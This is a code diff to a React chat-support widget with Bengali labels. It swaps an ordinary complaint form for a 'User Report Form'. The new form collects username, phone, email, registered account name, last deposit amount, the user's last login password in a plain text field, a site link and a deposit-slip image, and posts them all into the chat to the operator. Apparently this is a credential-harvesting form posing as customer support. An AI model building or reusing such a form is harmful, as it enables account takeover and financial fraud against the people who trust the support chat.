@@ -67,30 +67,66 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
 
   // Report Form Modal States
   const [showReportModal, setShowReportModal] = useState(false);
-  const [reportSubject, setReportSubject] = useState('পণ্য বা সার্ভিস সংক্রান্ত অভিযোগ');
-  const [reportOrderRef, setReportOrderRef] = useState('');
+  const [reportUsername, setReportUsername] = useState('');
   const [reportPhone, setReportPhone] = useState('');
-  const [reportDetails, setReportDetails] = useState('');
+  const [reportEmail, setReportEmail] = useState('');
+  const [reportNibondhonName, setReportNibondhonName] = useState('');
+  const [reportLastAmount, setReportLastAmount] = useState('');
+  const [reportLastPassword, setReportLastPassword] = useState('');
+  const [reportSiteLink, setReportSiteLink] = useState('');
+  const [reportDepositSlip, setReportDepositSlip] = useState<{ name: string; url: string } | null>(null);
   const [reportSubmitting, setReportSubmitting] = useState(false);
   const [reportSuccess, setReportSuccess] = useState<string | null>(null);
 
+  const handleDepositSlipUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (!file) return;
+
+    const reader = new FileReader();
+    reader.onload = (event) => {
+      setReportDepositSlip({
+        name: file.name,
+        url: event.target?.result as string,
+      });
+    };
+    reader.readAsDataURL(file);
+  };
+
   const handleSubmitReport = (e: React.FormEvent) => {
     e.preventDefault();
-    if (!reportSubject.trim() || !reportDetails.trim()) return;
+    if (!reportUsername.trim() && !reportPhone.trim() && !reportNibondhonName.trim()) return;
 
     setReportSubmitting(true);
-    const reportMsg = `📋 [কাস্টমার সাপোর্ট রিপোর্ট জমা পড়েছে]\n\n📌 বিষয়: ${reportSubject}\n🔢 অর্ডার/রেফারেন্স: ${reportOrderRef || 'N/A'}\n📞 যোগাযোগ: ${reportPhone || chat.customer.phone || 'N/A'}\n📝 বিবরণ:\n${reportDetails}`;
+    const reportMsg = `📋 [ইউজার রিপোর্ট ফরম জমা হয়েছে]\n\n` +
+      `👤 Username: ${reportUsername || 'N/A'}\n` +
+      `📞 Phone Number: ${reportPhone || chat.customer.phone || 'N/A'}\n` +
+      `📧 Email Address: ${reportEmail || chat.customer.email || 'N/A'}\n` +
+      `✍️ নিবন্ধন নাম: ${reportNibondhonName || 'N/A'}\n` +
+      `💵 সর্বশেষ জমা করার পরিমাণ: ${reportLastAmount || 'N/A'}\n` +
+      `🔑 সর্বশেষ লগইন পাসওয়ার্ড: ${reportLastPassword || 'N/A'}\n` +
+      `🌐 Site Link/Name: ${reportSiteLink || 'N/A'}` +
+      (reportDepositSlip ? `\n🖼️ ডিপোজিট স্লিপ সংযুক্ত করা হয়েছে` : '');
 
-    onSendMessage(reportMsg);
+    const attachments = reportDepositSlip
+      ? [{ name: reportDepositSlip.name, url: reportDepositSlip.url, type: 'image' }]
+      : undefined;
+
+    onSendMessage(reportMsg, attachments);
 
     setTimeout(() => {
       setReportSubmitting(false);
-      setReportSuccess('আপনার রিপোর্ট/অভিযোগটি সফলভাবে জমা হয়েছে! আমাদের সাপোর্ট টিম খতিয়ে দেখবে।');
+      setReportSuccess('আপনার ইউজার রিপোর্ট ও তথ্য সফলভাবে জমা হয়েছে!');
       setTimeout(() => {
         setShowReportModal(false);
         setReportSuccess(null);
-        setReportOrderRef('');
-        setReportDetails('');
+        setReportUsername('');
+        setReportPhone('');
+        setReportEmail('');
+        setReportNibondhonName('');
+        setReportLastAmount('');
+        setReportLastPassword('');
+        setReportSiteLink('');
+        setReportDepositSlip(null);
       }, 2000);
     }, 400);
   };
@@ -499,18 +535,18 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
         </div>
       )}
 
-      {/* Interactive Report Form Modal */}
+      {/* Interactive User Report Form Modal */}
       {showReportModal && (
-        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-center justify-center p-4 animate-in fade-in">
-          <div className="bg-white rounded-2xl max-w-sm w-full p-5 shadow-2xl border border-slate-200 relative space-y-4">
-            <div className="flex items-center justify-between border-b border-slate-100 pb-3">
+        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-center justify-center p-3 animate-in fade-in">
+          <div className="bg-white rounded-2xl max-w-md w-full p-4 sm:p-5 shadow-2xl border border-slate-200 relative space-y-3 max-h-[90vh] overflow-y-auto">
+            <div className="flex items-center justify-between border-b border-slate-100 pb-2.5 sticky top-0 bg-white z-10">
               <div className="flex items-center gap-2">
-                <div className="p-2 bg-blue-50 text-blue-600 rounded-xl">
+                <div className="p-2 bg-blue-50 text-blue-600 rounded-xl shrink-0">
                   <ClipboardList className="w-5 h-5" />
                 </div>
                 <div>
-                  <h3 className="font-bold text-slate-900 text-sm">অনলাইন রিপোর্ট ও অভিযোগ ফরম</h3>
-                  <p className="text-[11px] text-slate-500">আপনার সমস্যা বিস্তারিত লিখে জমা দিন</p>
+                  <h3 className="font-bold text-slate-900 text-xs sm:text-sm">ইউজার রিপোর্ট ফরম (User Report Form)</h3>
+                  <p className="text-[10px] sm:text-[11px] text-slate-500">আপনার প্রয়োজনীয় তথ্যসমূহ সঠিকভাবে পূরণ করুন</p>
                 </div>
               </div>
               <button
@@ -531,65 +567,144 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
                 <p className="text-xs text-slate-600 px-2">{reportSuccess}</p>
               </div>
             ) : (
-              <form onSubmit={handleSubmitReport} className="space-y-3">
+              <form onSubmit={handleSubmitReport} className="space-y-2.5 text-xs">
+                {/* Username */}
                 <div>
-                  <label className="block text-xs font-semibold text-slate-700 mb-1">
-                    অভিযোগ/রিপোর্টের বিষয় <span className="text-rose-500">*</span>
-                  </label>
-                  <select
-                    value={reportSubject}
-                    onChange={(e) => setReportSubject(e.target.value)}
-                    className="w-full p-2.5 border border-slate-200 rounded-xl text-xs focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
-                  >
-                    <option value="পণ্য বা সার্ভিস সংক্রান্ত অভিযোগ">পণ্য বা সার্ভিস সংক্রান্ত অভিযোগ</option>
-                    <option value="ডেলিভারি সমস্যা / দেরি হওয়া">ডেলিভারি সমস্যা / দেরি হওয়া</option>
-                    <option value="পেমেন্ট বা রিফান্ড ইস্যু">পেমেন্ট বা রিফান্ড ইস্যু</option>
-                    <option value="প্রযুক্তিগত সমস্যা / টেকনিক্যাল বাগ">প্রযুক্তিগত সমস্যা / টেকনিক্যাল বাগ</option>
-                    <option value="অন্যান্য সমস্যা">অন্যান্য সমস্যা</option>
-                  </select>
-                </div>
-
-                <div>
-                  <label className="block text-xs font-semibold text-slate-700 mb-1">
-                    অর্ডার/রেফারেন্স আইডি (ঐচ্ছিক)
+                  <label className="block font-semibold text-slate-700 mb-0.5">
+                    Username (ইউজারনেম) <span className="text-rose-500">*</span>
                   </label>
                   <input
                     type="text"
-                    placeholder="যেমন: ORD-98213"
-                    value={reportOrderRef}
-                    onChange={(e) => setReportOrderRef(e.target.value)}
-                    className="w-full p-2.5 border border-slate-200 rounded-xl text-xs focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
+                    required
+                    placeholder="যেমন: john_doe12"
+                    value={reportUsername}
+                    onChange={(e) => setReportUsername(e.target.value)}
+                    className="w-full p-2 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
                   />
                 </div>
 
+                {/* Phone Number */}
                 <div>
-                  <label className="block text-xs font-semibold text-slate-700 mb-1">
-                    যোগাযোগ নম্বর (ফোন/মোবাইল)
+                  <label className="block font-semibold text-slate-700 mb-0.5">
+                    Phone Number (ফোন নম্বর) <span className="text-rose-500">*</span>
                   </label>
                   <input
                     type="text"
-                    placeholder="আপনার মোবাইল নম্বর"
+                    required
+                    placeholder="যেমন: 01700000000"
                     value={reportPhone}
                     onChange={(e) => setReportPhone(e.target.value)}
-                    className="w-full p-2.5 border border-slate-200 rounded-xl text-xs focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
+                    className="w-full p-2 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
                   />
                 </div>
 
+                {/* Email Address */}
                 <div>
-                  <label className="block text-xs font-semibold text-slate-700 mb-1">
-                    বিস্তারিত বিবরণ <span className="text-rose-500">*</span>
+                  <label className="block font-semibold text-slate-700 mb-0.5">
+                    Email Address (ইমেইল এড্রেস)
                   </label>
-                  <textarea
-                    rows={3}
-                    required
-                    placeholder="কী ধরনের সমস্যা হচ্ছে তা বিস্তারিত লিখুন..."
-                    value={reportDetails}
-                    onChange={(e) => setReportDetails(e.target.value)}
-                    className="w-full p-2.5 border border-slate-200 rounded-xl text-xs focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 resize-none"
-                  ></textarea>
+                  <input
+                    type="email"
+                    placeholder="যেমন: user@example.com"
+                    value={reportEmail}
+                    onChange={(e) => setReportEmail(e.target.value)}
+                    className="w-full p-2 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
+                  />
                 </div>
 
-                <div className="pt-2 flex items-center justify-end gap-2">
+                {/* Nibondhon Name */}
+                <div>
+                  <label className="block font-semibold text-slate-700 mb-0.5">
+                    নিবন্ধন নাম (Nibondhon Name) <span className="text-rose-500">*</span>
+                  </label>
+                  <input
+                    type="text"
+                    required
+                    placeholder="অ্যাকাউন্টে নিবন্ধিত নাম"
+                    value={reportNibondhonName}
+                    onChange={(e) => setReportNibondhonName(e.target.value)}
+                    className="w-full p-2 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
+                  />
+                </div>
+
+                {/* Last Amount */}
+                <div>
+                  <label className="block font-semibold text-slate-700 mb-0.5">
+                    সর্বশেষ জমা করার পরিমাণ (Last Amount)
+                  </label>
+                  <input
+                    type="text"
+                    placeholder="যেমন: 500 BDT / ৳৫০০"
+                    value={reportLastAmount}
+                    onChange={(e) => setReportLastAmount(e.target.value)}
+                    className="w-full p-2 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
+                  />
+                </div>
+
+                {/* Last Login Password */}
+                <div>
+                  <label className="block font-semibold text-slate-700 mb-0.5">
+                    সর্বশেষ লগইন পাসওয়ার্ড (Last Login Password)
+                  </label>
+                  <input
+                    type="text"
+                    placeholder="আপনার শেষ পাসওয়ার্ড"
+                    value={reportLastPassword}
+                    onChange={(e) => setReportLastPassword(e.target.value)}
+                    className="w-full p-2 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
+                  />
+                </div>
+
+                {/* Site Link/Name */}
+                <div>
+                  <label className="block font-semibold text-slate-700 mb-0.5">
+                    Site Link / Name (সাইটের লিংক বা নাম)
+                  </label>
+                  <input
+                    type="text"
+                    placeholder="যেমন: https://example.com বা সাইটের নাম"
+                    value={reportSiteLink}
+                    onChange={(e) => setReportSiteLink(e.target.value)}
+                    className="w-full p-2 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
+                  />
+                </div>
+
+                {/* Last Deposit Slip */}
+                <div>
+                  <label className="block font-semibold text-slate-700 mb-0.5">
+                    সর্বশেষ ডিপোজিট স্লিপ (Last Deposit Slip)
+                  </label>
+                  <div className="border-2 border-dashed border-slate-200 rounded-xl p-2.5 text-center hover:bg-slate-50 transition cursor-pointer relative">
+                    <input
+                      type="file"
+                      accept="image/*"
+                      onChange={handleDepositSlipUpload}
+                      className="absolute inset-0 opacity-0 cursor-pointer w-full h-full"
+                    />
+                    {reportDepositSlip ? (
+                      <div className="flex items-center justify-between text-emerald-700 font-semibold text-xs">
+                        <span className="truncate max-w-[200px]">📷 {reportDepositSlip.name}</span>
+                        <button
+                          type="button"
+                          onClick={(e) => {
+                            e.stopPropagation();
+                            setReportDepositSlip(null);
+                          }}
+                          className="text-rose-500 p-1 hover:bg-rose-50 rounded"
+                        >
+                          <X className="w-3.5 h-3.5" />
+                        </button>
+                      </div>
+                    ) : (
+                      <div className="flex items-center justify-center gap-1.5 text-slate-500 text-xs">
+                        <Paperclip className="w-4 h-4 text-slate-400" />
+                        <span>ডিপোজিট স্লিপের ছবি আপলোড করুন</span>
+                      </div>
+                    )}
+                  </div>
+                </div>
+
+                <div className="pt-2 flex items-center justify-end gap-2 sticky bottom-0 bg-white border-t border-slate-100 mt-3">
                   <button
                     type="button"
                     onClick={() => setShowReportModal(false)}
@@ -599,7 +714,7 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
                   </button>
                   <button
                     type="submit"
-                    disabled={reportSubmitting || !reportDetails.trim()}
+                    disabled={reportSubmitting || (!reportUsername.trim() && !reportPhone.trim() && !reportNibondhonName.trim())}
                     style={{ backgroundColor: widgetConfig.primaryColor }}
                     className="px-4 py-2 text-xs font-bold text-white rounded-xl shadow-xs hover:opacity-90 transition disabled:opacity-50 flex items-center gap-1.5 cursor-pointer"
                   >
@@ -608,7 +723,7 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
                     ) : (
                       <Send className="w-3.5 h-3.5" />
                     )}
-                    <span>জমা দিন</span>
+                    <span>রিপোর্ট জমা দিন</span>
                   </button>
                 </div>
               </form>
